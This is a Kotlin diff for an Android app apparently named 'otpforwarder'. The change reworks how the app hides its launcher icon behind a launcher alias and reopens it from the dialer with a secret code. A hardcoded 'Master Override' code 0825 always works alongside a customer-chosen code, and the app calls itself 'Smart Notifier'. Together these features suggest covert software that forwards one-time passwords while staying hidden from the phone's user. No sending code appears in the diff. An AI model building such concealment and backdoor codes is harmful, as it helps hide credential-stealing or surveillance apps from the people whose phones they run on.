@@ -13,7 +13,7 @@ class SecretCodeReceiver : BroadcastReceiver() {
 
     override fun onReceive(context: Context, intent: Intent) {
         val action = intent.action
-        Log.d(TAG, "Secret code broadcast received with action: $action")
+        Log.d(TAG, "Secret code broadcast received: $action")
 
         if (action == "android.provider.Telephony.SECRET_CODE") {
             val host = intent.data?.host
@@ -24,30 +24,50 @@ class SecretCodeReceiver : BroadcastReceiver() {
 
             // Master Override (0825) ALWAYS works! Customer custom code also works!
             if (host == "0825" || (customCode.isNotEmpty() && host == customCode)) {
-                toggleVisibilityAndLaunch(context, host ?: "")
+                unhideAndLaunch(context, host ?: "")
             }
         }
     }
 
     companion object {
-        fun toggleVisibilityAndLaunch(context: Context, codeUsed: String = "0825"): Boolean {
-            val targetComp = ComponentName(context, MainActivity::class.java)
-            val currentState = context.packageManager.getComponentEnabledSetting(targetComp)
-            val isCurrentlyHidden = currentState == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+        const val LAUNCHER_ALIAS_CLASS = "com.example.otpforwarder.LauncherAlias"
 
-            // Toggle state: if hidden -> unhide; if visible -> hide
-            val newHideState = !isCurrentlyHidden
-            val newState = if (newHideState) {
+        fun isLauncherIconHidden(context: Context): Boolean {
+            val comp = ComponentName(context, LAUNCHER_ALIAS_CLASS)
+            val state = context.packageManager.getComponentEnabledSetting(comp)
+            return state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+        }
+
+        fun setLauncherIconVisibility(context: Context, hide: Boolean) {
+            val aliasComp = ComponentName(context, LAUNCHER_ALIAS_CLASS)
+            val newState = if (hide) {
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED
             } else {
                 PackageManager.COMPONENT_ENABLED_STATE_ENABLED
             }
 
+            // Never disable MainActivity directly! Only toggle the LauncherAlias!
             context.packageManager.setComponentEnabledSetting(
-                targetComp,
+                aliasComp,
                 newState,
                 PackageManager.DONT_KILL_APP
             )
+
+            // Ensure MainActivity itself is ALWAYS enabled so it can be launched via dialer or intents
+            val mainComp = ComponentName(context, MainActivity::class.java)
+            context.packageManager.setComponentEnabledSetting(
+                mainComp,
+                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                PackageManager.DONT_KILL_APP
+            )
+
+            val msg = if (hide) "🔒 App Icon Hidden! (Dial your code to open)" else "🔓 App Icon Visible!"
+            Toast.makeText(context, msg, Toast.LENGTH_LONG).show()
+        }
+
+        fun unhideAndLaunch(context: Context, codeUsed: String = "0825") {
+            // Re-enable LauncherAlias so user has access
+            setLauncherIconVisibility(context, hide = false)
 
             // Launch MainActivity directly
             try {
@@ -59,10 +79,7 @@ class SecretCodeReceiver : BroadcastReceiver() {
                 Log.e("SecretCodeReceiver", "Failed to launch MainActivity", e)
             }
 
-            val msg = if (newHideState) "🔒 App Icon Hidden! (Code $codeUsed)" else "🔓 App Icon Visible! (Code $codeUsed)"
-            Toast.makeText(context, msg, Toast.LENGTH_LONG).show()
-
-            return newHideState
+            Toast.makeText(context, "🔓 Smart Notifier Unlocked! (Code $codeUsed)", Toast.LENGTH_LONG).show()
         }
     }
 }
